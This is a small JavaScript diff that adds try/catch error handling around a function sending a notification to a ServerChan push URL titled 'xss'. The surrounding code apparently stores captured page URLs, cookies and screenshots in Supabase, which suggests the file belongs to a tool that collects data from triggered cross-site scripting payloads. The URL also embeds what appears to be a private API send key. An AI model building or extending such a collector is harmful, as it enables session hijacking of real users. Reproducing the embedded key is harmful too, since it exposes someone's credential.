@@ -60,11 +60,16 @@ async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {
 
 // ===== 异步发送邮件函数 =====
 async function sendEmailNotification() {
-
+  try {
   const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=xss', {
     method: 'GET'
   });
-
   const result = await response.json();
   console.log('邮件发送结果:', result);
+  }
+  
+  catch(error){
+    console.error(error)
+
+  }
 }
